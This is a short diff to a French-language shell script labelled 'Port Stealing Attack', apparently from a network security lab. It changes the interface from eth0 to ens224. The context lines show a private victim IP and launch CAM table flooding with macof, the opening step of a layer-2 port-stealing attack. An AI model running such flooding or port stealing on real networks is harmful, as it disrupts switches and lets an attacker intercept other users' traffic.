@@ -4,8 +4,8 @@ echo "=== Port Stealing Attack ==="
 echo "Objectif: Voler le port d'une victime"
 
 VICTIM_IP="192.168.189.200"
-ATTACKER_MAC=$(ip link show eth0 | grep link | awk '{print $2}')
-INTERFACE="eth0"
+ATTACKER_MAC=$(ip link show ens224 | grep link | awk '{print $2}')
+INTERFACE="ens224"
 
 echo "1. CAM Flooding pour remplir la table CAM..."
 macof -i $INTERFACE &
